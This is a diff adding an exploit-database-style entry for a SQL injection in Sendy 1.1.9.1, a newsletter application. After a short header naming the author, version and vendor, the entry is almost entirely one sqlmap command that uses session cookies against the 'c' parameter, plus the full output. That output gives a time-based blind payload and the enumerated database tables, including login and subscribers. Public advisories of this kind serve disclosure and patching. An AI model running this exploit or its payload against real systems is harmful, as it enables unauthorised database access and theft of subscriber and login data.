@@ -1,0 +1,73 @@
+# Exploit Title: Sendy 1.1.9.1 - SQL Injection Vulnerability
+# Date: 2014-04-10
+# Exploit Author: marduk369
+# Vendor Homepage: http://sendy.co/
+# Software Link: http://sendy.co/
+# Version: 1.1.9.1
+
+root@kali:~# sqlmap -u 'http://server1/send-to?i=1&c=10' --cookie="version=1.1.9.1; PHPSESSID=[phpsessid value]; logged_in=[logged_in value]" -p c -D sendy --tables
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 11:48:57
+
+[11:48:57] [INFO] resuming back-end DBMS 'mysql' 
+[11:48:57] [INFO] testing connection to the target URL
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: c
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: c=10 AND SLEEP(5)&i=1
+---
+[11:48:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: PHP 5.3.2, Apache 2.2.14
+back-end DBMS: MySQL 5.0.11
+[11:48:58] [INFO] fetching tables for database: 'sendy'
+[11:48:58] [INFO] fetching number of tables for database 'sendy'
+[11:48:58] [WARNING] time-based comparison requires larger statistical model, please wait..............................
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[11:49:50] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors 
+[11:50:31] [INFO] adjusting time delay to 3 seconds due to good response times
+9
+[11:50:33] [INFO] retrieved: ap
+[11:53:39] [ERROR] invalid character detected. retrying..
+[11:53:39] [WARNING] increasing time delay to 4 seconds 
+ps
+[11:56:31] [INFO] retrieved: ares
+[12:00:00] [INFO] retrieved: ares_emails
+[12:08:38] [INFO] retrieved: campaigns
+[12:18:08] [INFO] retrieved: links
+[12:24:28] [ERROR] invalid character detected. retrying..
+[12:24:28] [WARNING] increasing time delay to 5 seconds 
+
+[12:24:31] [INFO] retrieved: lists
+[12:29:49] [INFO] retrieved: login
+[12:36:33] [ERROR] invalid character detected. retrying..
+[12:36:33] [WARNING] increasing time delay to 6 seconds 
+
+[12:36:37] [INFO] retrieved: queue
+[12:43:51] [INFO] retrieved: subscribers
+Database: sendy
+[9 tables]
++-------------+
+| apps        |
+| ares        |
+| ares_emails |
+| campaigns   |
+| links       |
+| lists       |
+| login       |
+| queue       |
+| subscribers |
++-------------+
+
+[13:00:16] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/server1'
+
+[*] shutting down at 13:00:16
+
